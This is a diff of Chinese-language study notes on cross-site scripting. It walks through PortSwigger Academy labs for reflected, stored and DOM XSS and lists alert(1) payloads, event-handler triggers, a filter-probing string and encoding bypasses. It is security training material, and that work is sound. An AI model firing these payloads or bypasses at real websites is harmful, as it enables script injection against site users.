@@ -1,6 +1,129 @@
-注入恶意脚本, 窃取目标数据.
+XSS 最终是在前端执行的, 而后端往往会对传入的字符进行处理, 避免执行 XSS.
 
-## 1 嵌入式 XSS
+## 1. 原理
+
+当我搜索 test 时
+
+```
+GET /?search=test HTTP/2
+Host: web-security-academy.net
+```
+
+后端会将我输入的字符处理后返回到前端
+
+```
+<h1>1 search results for 'test'</h1>
+```
+
+若我搜索的内容是一段 XSS, 那么前端就会执行
+
+```
+<h1>0 search results for '<script>alert(1)</script>'</h1>
+```
+
+### 1.1 常用执行函数
+
+```
+alert(1)       # 弹窗验证
+console.log(1) # 控制台验证
+```
+
+### 1.2 常用触发事件
+
+```
+onload="alert(1)"	    # 元素加载完成时触发
+onerror="alert(1)"	    # 元素加载失败时触发（常用于 <img>）
+onmousemove="alert(1)"	# 鼠标移动到元素上方时触发
+onclick="alert(1)"	    # 点击元素时触发
+ondblclick="alert(1)"	# 双击元素时触发
+onmouseover="alert(1)"	# 鼠标悬停在元素上方时触发
+onmousedown="alert(1)"	# 鼠标按下时触发
+onmouseup="alert(1)"	# 鼠标松开时触发
+onfocus="alert(1)"	    # 元素获得焦点时触发（如 <input>）
+```
+
+## 2. 插入式 XSS
+
+### 2.1. [Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)
+
+查看前端代码
+
+```
+<h1>1 search results for 'test'</h1>
+```
+
+后端未对传入的字符进行任何处理
+
+```
+<script>alert(1)</script>
+```
+
+### 2.2. [Stored XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)
+
+查看前端代码
+
+```
+<p>test</p>
+```
+
+后端未对传入的字符进行任何处理
+
+```
+<script>alert(1)</script>
+```
+
+### 2.3. [DOM XSS in `document.write` sink using source `location.search`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)
+
+查看前端代码
+
+```
+<h1>3 search results for 'test'</h1>
+```
+
+后端对传入的特殊字符进行 HTML 转义
+
+```
+<h1>0 search results for '&lt;script&gt;alert(1)&lt;/script&gt;'</h1>
+```
+
+提交这个字符串可以判断过滤了哪些字符，有的字符只可在 IE 中使用
+
+```
+xss"""'`>,:;onmousemovejavascriptstyle(1)
+```
+
+```
+<h1>0 search results for 'xss"""'\`&gt;,:;onmousemovejavascriptstyle(1)'</h1>
+```
+
+可以看到特殊字符被转义, 可是在另一个位置返回以下前端代码, 怀疑存在 DOM XSS
+
+```
+<img src="/resources/images/tracker.gif?searchTerms=xss" ""'`="">
+,:;onmousemovejavascriptstyle(1)"&gt; 
+```
+
+简化这段前端代码
+
+```
+<img src="/resources/images/tracker.gif?searchTerms=">
+```
+
+由于这段代码处于 `<img>` 标签中, 可通过插入事件触发
+
+```
+xss" onerror="alert(1)"
+```
+
+或者通过闭合 `<img>` 标签触发
+
+```
+"><img src="x" onerror="alert(1)">
+"><svg onload=alert(1)>
+"><script>alert(1)</script>
+```
+
+## 3. 嵌入式 XSS
 
 在文件中嵌入恶意脚本后上传, 当目标加载文件时会触发 XSS 攻击.
 
@@ -49,12 +172,10 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 
 参考链接
 
-- [xss](https://github.com/jadensalas469466/tools/tree/main/attack/payload/xss)
+- [xss](https://github.com/jadensalas469466/tools/tree/main/hack/payload/xss)
 - [pdfsvgxsspayload](https://github.com/ynsmroztas/pdfsvgxsspayload)
 
 ## ==未归纳==
-
-
 
 ```html
 "><script>alert(1)</script>
@@ -80,16 +201,10 @@ Host: hb.wanguoschool.com
 javascript
 ```
 
-提交这个字符串可以判断过滤了哪些字符，有的字符只可在 IE 中使用
-
-```
-xss"""'`> ,:;onmousemovejavascriptstyle
-```
-
 分隔符绕过，某些分隔符会让后面的字符串变成新的属性，例如：`<input type="text" name="p1" value="xss"> ,:;onmousemove="alert(6)"` ，生成了 `onmousemove=""` 属性
 
 ```
-xss"> ,:;onmousemove=alert(6)
+xss"> ,:;onmousemove=alert(1)
 ```
 
 任意标签可插入 JS 标签绕过
@@ -283,17 +398,5 @@ svg 可以自动解析 js 标签中的 html 编码
 
 ```
 <svg><script>&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script>
-```
-
-弹窗验证
-
-```
-alert(1)
-```
-
-控制台验证
-
-```
-console.log(1)
 ```
 
